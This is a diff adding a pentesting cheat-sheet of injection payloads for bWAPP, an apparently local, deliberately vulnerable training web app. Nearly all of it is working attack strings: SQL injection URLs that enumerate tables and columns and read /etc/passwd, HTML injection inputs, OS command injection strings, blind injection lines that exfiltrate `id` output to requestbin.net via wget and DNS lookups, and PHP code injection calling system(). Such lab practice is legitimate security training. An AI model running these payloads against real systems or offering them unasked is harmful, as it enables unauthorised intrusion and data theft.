@@ -1,0 +1,41 @@
+A1 (Injection)
+		* SQL injection GET - bWAPP
+			sqli_2.php?movie=2'&action=go
+			sqli_2.php?movie=2 and 1=1&action=go
+			sqli_2.php?movie=2 order by 7-- -&action=go
+			sqli_2.php?movie=2 and 1=2 union all select 1,2,3,4,group_concat('<br>',table_name),6,7 from information_schema.tables&action=go
+			sqli_2.php?movie=2 and 1=2 union all select 1,version(),database(),4,group_concat('<br>',column_name),6,7 from information_schema.columns where table_name='users'&action=go
+			sqli_2.php?movie=2 and 1=2 union all select 1,2,3,4,load_file('/etc/passwd'),6,7 from users&action=go
+
+		* SQL injection POST - bWAPP
+			http://127.0.0.1/bWAPP/bWAPP/sqli_13.php
+
+		---------------------------
+
+		* HTML injection GET - bWAPP
+			htmli_get.php?firstname=admin&lastname=admin&form=submit
+			htmli_get.php?firstname=/(=)><"'&lastname=/(=)><"'&form=submit
+			htmli_get.php?firstname=<h1>base4sec&lastname=<h1>pwn&form=submit
+			
+		* HTML injection POST - bWAPP
+			http://127.0.0.1/bWAPP/bWAPP/htmli_post.php
+
+		---------------------------
+
+		* OS command injection
+			1;ls -l
+			1|cat /etc/passwd
+
+		---------------------------
+
+		* OS command injection blind
+			1;wget http://requestbin.net/r/1gmlq2c1?v=`id`
+			1;for i in $(id);do wget http://requestbin.net/r/1bpn34a1?v=$i;done
+			1;nslookup `id`.97bcc21a2a330eda953a.d.requestbin.net
+			1;for i in $(id);do nslookup $i.97bcc21a2a330eda953a.d.requestbin.net;done
+
+		---------------------------
+
+		* PHP code injection - bWAPP
+			phpi.php?message=system("id")
+			phpi.php?message=passthru('id')
